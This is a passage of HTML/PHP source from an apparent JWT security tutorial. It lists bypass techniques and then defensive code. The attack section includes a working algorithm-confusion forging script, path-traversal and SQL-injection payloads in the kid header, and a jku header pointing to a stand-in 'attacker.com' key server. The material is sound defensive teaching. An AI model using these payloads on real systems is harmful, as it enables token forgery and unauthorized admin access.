    <span class="code-keyword">return</span> jwt.<span class="code-function">verify</span>(token, process.env.JWT_SECRET, {
        algorithms: [<span class="code-string">'HS256'</span>],      <span class="code-comment">// Whitelist allowed algorithms</span>
        issuer: JWT_CONFIG.issuer,
        audience: JWT_CONFIG.audience,
        clockTolerance: <span class="code-keyword">30</span>,           <span class="code-comment">// 30 seconds leeway</span>
        maxAge: <span class="code-string">'15m'</span>                <span class="code-comment">// Maximum token age</span>
    });
}</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> JWT Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ various techniques to bypass JWT security controls. Understanding these helps in building
          robust defenses.
        </p>

        <h3 class="subsection-title">1. Algorithm Confusion (RS256 → HS256)</h3>
        <p class="text-content">
          The most critical JWT bypass. When servers use asymmetric algorithms (RS256) but don't verify the algorithm
          type, attackers can force HMAC verification using the public key.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Algorithm Confusion Exploit</span></div>
          <pre><code><span class="code-keyword">import</span> jwt
<span class="code-keyword">import</span> requests

<span class="code-comment"># Step 1: Get public key from JWKS endpoint</span>
resp = requests.<span class="code-function">get</span>(<span class="code-string">'https://target.com/.well-known/jwks.json'</span>)
jwks = resp.<span class="code-function">json</span>()
public_key = jwks[<span class="code-string">'keys'</span>][<span class="code-keyword">0</span>][<span class="code-string">'x5c'</span>][<span class="code-keyword">0</span>]

<span class="code-comment"># Step 2: Craft malicious payload</span>
payload = {<span class="code-string">"sub"</span>: <span class="code-string">"admin"</span>, <span class="code-string">"role"</span>: <span class="code-string">"admin"</span>}

<span class="code-comment"># Step 3: Sign with public key as HMAC secret</span>
token = jwt.<span class="code-function">encode</span>(payload, public_key, algorithm=<span class="code-string">'HS256'</span>)

<span class="code-comment"># Step 4: Server verifies: HMAC(token, public_key) == signature ✓</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Key ID (kid) Header Injection</h3>
        <p class="text-content">
          The "kid" (Key ID) header parameter specifies which key to use for verification. If the server uses the kid
          to look up keys from a filesystem or database, path traversal or SQL injection in the kid parameter can
          lead to key manipulation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">KID Path Traversal</span></div>
          <pre><code><span class="code-comment">-- Server looks up key: /var/keys/{kid}.pem</span>

<span class="code-comment">-- Attacker sets kid to traverse filesystem</span>
{
    <span class="code-attr">"alg"</span>: <span class="code-string">"HS256"</span>,
    <span class="code-attr">"typ"</span>: <span class="code-string">"JWT"</span>,
    <span class="code-attr">"kid"</span>: <span class="code-string">"../../../dev/null"</span>
}

<span class="code-comment">-- Server reads: /var/keys/../../../dev/null.pem (fails or reads empty)</span>
<span class="code-comment">-- Or if error handling is poor, uses default weak key</span>

<span class="code-comment">-- Alternative: SQL Injection in KID</span>
{
    <span class="code-attr">"kid"</span>: <span class="code-string">"1' UNION SELECT 'attacker_key' --"</span>
}</code></pre>
        </div>

        <h3 class="subsection-title">3. JWKS Spoofing</h3>
        <p class="text-content">
          If the application fetches signing keys from a URL (jku or x5u header parameters), attackers can point to
          their own key server.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">JWKS URL Injection</span></div>
          <pre><code><span class="code-comment">-- Attacker creates malicious JWKS at attacker.com/jwks.json</span>
{
    <span class="code-attr">"keys"</span>: [{
        <span class="code-attr">"kty"</span>: <span class="code-string">"RSA"</span>,
        <span class="code-attr">"kid"</span>: <span class="code-string">"attacker-key"</span>,
        <span class="code-attr">"n"</span>: <span class="code-string">"attacker-controlled-modulus..."</span>,
        <span class="code-attr">"e"</span>: <span class="code-string">"AQAB"</span>
    }]
}

<span class="code-comment">-- Forges token with jku pointing to attacker server</span>
{
    <span class="code-attr">"alg"</span>: <span class="code-string">"RS256"</span>,
    <span class="code-attr">"jku"</span>: <span class="code-string">"https://attacker.com/jwks.json"</span>,
    <span class="code-attr">"kid"</span>: <span class="code-string">"attacker-key"</span>
}</code></pre>
        </div>

        <h3 class="subsection-title">4. Token Replay and Expiration Bypass</h3>
        <p class="text-content">
          Weak expiration handling or missing token revocation allows replay attacks even after password changes or
          logout.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Expiration Bypass</span></div>
          <pre><code><span class="code-comment">-- Server doesn't verify exp claim</span>
<span class="code-keyword">if</span> (!<span class="code-function">isset</span>(<span class="code-keyword">$decoded</span>->exp)) {
    <span class="code-comment">// Accepts token without expiration!</span>
}

<span class="code-comment">-- Or accepts expired tokens with clock skew</span>
<span class="code-keyword">$leeway</span> = <span class="code-keyword">86400</span>;  <span class="code-comment">// 24 hours leeway - way too much!</span>
JWT::<span class="code-function">$leeway</span> = <span class="code-keyword">$leeway</span>;

<span class="code-comment">-- No token revocation list (logout doesn't invalidate token)</span>
<span class="code-comment">-- Token remains valid until expiration even after password change</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Embedded Public Key (x5c) Injection</h3>
        <p class="text-content">
          Some JWT libraries allow embedding X.509 certificates in the x5c header. Attackers can embed self-signed
          certificates with attacker-controlled public keys.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">x5c Certificate Injection</span></div>
          <pre><code><span class="code-comment">-- Attacker generates self-signed certificate</span>
openssl req -x509 -newkey rsa:2048 -keyout attacker.pem -out attacker.crt -days 365 -nodes

<span class="code-comment">-- Embeds certificate in JWT header</span>
{
    <span class="code-attr">"alg"</span>: <span class="code-string">"RS256"</span>,
    <span class="code-attr">"x5c"</span>: [<span class="code-string">"MIIDXTCCAkWgAwIBAgIJAJC1HiIAZAiU..."</span>]
}

<span class="code-comment">-- Server extracts public key from x5c and verifies signature</span>
<span class="code-comment">-- Attacker signed token with corresponding private key</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> JWT Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never trust the client, never trust the token header implicitly, and always
          verify with strict configuration. JWT security requires algorithm whitelisting, strong secrets, proper
          expiration, and token revocation capabilities.
        </div>

        <h3 class="subsection-title">Layer 1: Strict Algorithm Validation</h3>
        <p class="text-content">
          Explicitly whitelist allowed algorithms and reject any token specifying an unexpected or "none" algorithm.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Algorithm Whitelisting</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">use</span> \<span class="code-function">Firebase</span>\<span class="code-function">JWT</span>\<span class="code-function">JWT</span>;
<span class="code-keyword">use</span> \<span class="code-function">Firebase</span>\<span class="code-function">JWT</span>\<span class="code-function">Key</span>;

<span class="code-comment">// CRITICAL: Only allow expected algorithm</span>
<span class="code-keyword">$allowed_algs</span> = [<span class="code-string">'HS256'</span>];  <span class="code-comment">// Explicit whitelist</span>

<span class="code-keyword">try</span> {
    <span class="code-keyword">$decoded</span> = JWT::<span class="code-function">decode</span>(
        <span class="code-keyword">$jwt</span>, 
        <span class="code-keyword">new</span> <span class="code-function">Key</span>(<span class="code-keyword">$secret</span>, <span class="code-string">'HS256'</span>)
    );
} <span class="code-keyword">catch</span> (<span class="code-function">UnexpectedValueException</span> <span class="code-keyword">$e</span>) {
    <span class="code-comment">// Log and reject</span>
    <span class="code-function">error_log</span>(<span class="code-string">"JWT algorithm mismatch: "</span> . <span class="code-keyword">$e</span>-><span class="code-function">getMessage</span>());
    <span class="code-function">http_response_code</span>(<span class="code-keyword">401</span>);
    <span class="code-function">die</span>(<span class="code-string">"Invalid token"</span>);
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Strong Secret Management</h3>
        <p class="text-content">
          Use cryptographically secure random secrets with sufficient entropy. Rotate secrets regularly and store
          securely.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secret Generation & Rotation</span></div>
          <pre><code><span class="code-comment">// Generate strong secret (256-bit minimum)</span>
<span class="code-keyword">const</span> crypto = <span class="code-function">require</span>(<span class="code-string">'crypto'</span>);
<span class="code-keyword">const</span> secret = crypto.<span class="code-function">randomBytes</span>(<span class="code-keyword">32</span>).<span class="code-function">toString</span>(<span class="code-string">'hex'</span>);

<span class="code-comment">// Secret rotation implementation</span>
<span class="code-keyword">class</span> <span class="code-function">SecretManager</span> {
    <span class="code-function">constructor</span>() {
        <span class="code-keyword">this</span>.<span class="code-attr">secrets</span> = <span class="code-keyword">new</span> <span class="code-function">Map</span>();
        <span class="code-keyword">this</span>.<span class="code-attr">currentKid</span> = <span class="code-keyword">null</span>;
    }
    
    <span class="code-function">rotateSecret</span>() {
        <span class="code-keyword">const</span> kid = crypto.<span class="code-function">randomUUID</span>();
        <span class="code-keyword">const</span> secret = crypto.<span class="code-function">randomBytes</span>(<span class="code-keyword">32</span>).<span class="code-function">toString</span>(<span class="code-string">'base64'</span>);
        <span class="code-keyword">this</span>.<span class="code-attr">secrets</span>.<span class="code-function">set</span>(kid, secret);
        <span class="code-keyword">this</span>.<span class="code-attr">currentKid</span> = kid;
        <span class="code-keyword">return</span> kid;
    }
    
    <span class="code-function">getSecret</span>(kid) {
        <span class="code-keyword">return</span> <span class="code-keyword">this</span>.<span class="code-attr">secrets</span>.<span class="code-function">get</span>(kid);
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Claim Validation</h3>
        <p class="text-content">
          Validate all standard claims (iss, aud, exp, nbf, iat) and implement custom claims for additional security.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Comprehensive Claim Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">validateClaims</span>(<span class="code-keyword">$decoded</span>) {
    <span class="code-comment">// Validate issuer</span>
    <span class="code-keyword">if</span> (<span class="code-keyword">$decoded</span>->iss !== <span class="code-function">getenv</span>(<span class="code-string">'JWT_ISSUER'</span>)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Invalid issuer'</span>);
    }
    
    <span class="code-comment">// Validate audience</span>
    <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-function">getenv</span>(<span class="code-string">'JWT_AUDIENCE'</span>), (array)<span class="code-keyword">$decoded</span>->aud)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Invalid audience'</span>);
    }
    
    <span class="code-comment">// Check expiration with minimal clock skew</span>
    <span class="code-keyword">if</span> (<span class="code-keyword">$decoded</span>->exp < <span class="code-function">time</span>() - <span class="code-keyword">5</span>) {  <span class="code-comment">// 5 seconds leeway max</span>
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Token expired'</span>);
    }
    
    <span class="code-comment">// Check not before</span>
    <span class="code-keyword">if</span> (<span class="code-function">isset</span>(<span class="code-keyword">$decoded</span>->nbf) && <span class="code-keyword">$decoded</span>->nbf > <span class="code-function">time</span>() + <span class="code-keyword">5</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Token not yet valid'</span>);
    }
    
    <span class="code-comment">// Validate issued at (prevent future tokens)</span>
    <span class="code-keyword">if</span> (<span class="code-keyword">$decoded</span>->iat > <span class="code-function">time</span>() + <span class="code-keyword">5</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Token issued in future'</span>);
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Token Binding and Revocation</h3>
        <p class="text-content">
          Implement token binding to prevent replay attacks and maintain a revocation list for logged-out or
          compromised tokens.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Token Revocation List</span></div>
          <pre><code><span class="code-keyword">const</span> redis = <span class="code-function">require</span>(<span class="code-string">'redis'</span>);
<span class="code-keyword">const</span> client = redis.<span class="code-function">createClient</span>();

<span class="code-keyword">class</span> <span class="code-function">TokenRevocation</span> {
    <span class="code-comment">// Add token to revocation list (on logout or password change)</span>
    <span class="code-keyword">async</span> <span class="code-function">revoke</span>(jti, exp) {
        <span class="code-keyword">const</span> ttl = exp - Math.<span class="code-function">floor</span>(Date.<span class="code-function">now</span>() / <span class="code-keyword">1000</span>);
        <span class="code-keyword">if</span> (ttl > <span class="code-keyword">0</span>) {
            <span class="code-keyword">await</span> client.<span class="code-function">setEx</span>(<span class="code-string">`revoked:${jti}`</span>, ttl, <span class="code-string">'1'</span>);
        }
    }
    
    <span class="code-comment">// Check if token is revoked</span>
    <span class="code-keyword">async</span> <span class="code-function">isRevoked</span>(jti) {
        <span class="code-keyword">return</span> <span class="code-keyword">await</span> client.<span class="code-function">get</span>(<span class="code-string">`revoked:${jti}`</span>) !== <span class="code-keyword">null</span>;
    }
    
    <span class="code-comment">// Token binding to prevent replay</span>
    <span class="code-keyword">async</span> <span class="code-function">bindToSession</span>(jti, sessionFingerprint) {
        <span class="code-keyword">await</span> client.<span class="code-function">set</span>(<span class="code-string">`binding:${jti}`</span>, sessionFingerprint);
    }
    
    <span class="code-keyword">async</span> <span class="code-function">verifyBinding</span>(jti, sessionFingerprint) {
        <span class="code-keyword">const</span> bound = <span class="code-keyword">await</span> client.<span class="code-function">get</span>(<span class="code-string">`binding:${jti}`</span>);
        <span class="code-keyword">return</span> bound === sessionFingerprint;
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Secure Library Configuration</h3>
        <p class="text-content">
          Use well-maintained JWT libraries and configure them securely. Avoid deprecated or vulnerable versions.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Library Security Checklist</span></div>
          <pre><code><span class="code-comment">// Node.js - jsonwebtoken secure configuration</span>
<span class="code-keyword">const</span> jwt = <span class="code-function">require</span>(<span class="code-string">'jsonwebtoken'</span>);

<span class="code-comment">// Verify options - strict configuration</span>
<span class="code-keyword">const</span> verifyOptions = {
    algorithms: [<span class="code-string">'HS256'</span>],        <span class="code-comment">// Whitelist only</span>
    issuer: <span class="code-string">'https://auth.example.com'</span>,
    audience: <span class="code-string">'https://api.example.com'</span>,
    clockTolerance: <span class="code-keyword">0</span>,              <span class="code-comment">// No tolerance</span>
    maxAge: <span class="code-string">'15m'</span>,                <span class="code-comment">// Maximum age</span>
    complete: <span class="code-keyword">false</span>               <span class="code-comment">// Don't return decoded header</span>
};

<span class="code-comment">// Python - PyJWT secure configuration</span>
<span class="code-keyword">import</span> jwt

decoded = jwt.<span class="code-function">decode</span>(
    token,
    secret,
    algorithms=[<span class="code-string">'HS256'</span>],       <span class="code-comment"># Explicit whitelist</span>
    options={
        <span class="code-string">"require"</span>: [<span class="code-string">"exp"</span>, <span class="code-string">"iat"</span>, <span class="code-string">"iss"</span>],
        <span class="code-string">"verify_exp"</span>: <span class="code-keyword">True</span>,
        <span class="code-string">"verify_iat"</span>: <span class="code-keyword">True</span>,
        <span class="code-string">"verify_iss"</span>: <span class="code-keyword">True</span>
    },
    issuer=<span class="code-string">"https://auth.example.com"</span>,
    audience=<span class="code-string">"https://api.example.com"</span>
)</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Algorithm Whitelist</td>
              <td style="padding: 0.75rem;">Explicitly allow only expected algorithms</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Strong Secrets</td>
              <td style="padding: 0.75rem;">256-bit+ random secrets from secure storage</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Claim Validation</td>
              <td style="padding: 0.75rem;">Validate iss, aud, exp, nbf, iat strictly</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Token Revocation</td>
              <td style="padding: 0.75rem;">Implement logout/password change invalidation</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Short Expiration</td>
              <td style="padding: 0.75rem;">15 minutes max, refresh token rotation</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Library Updates</td>
              <td style="padding: 0.75rem;">Keep JWT libraries updated, audit dependencies</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for JWT</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete JWT security implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>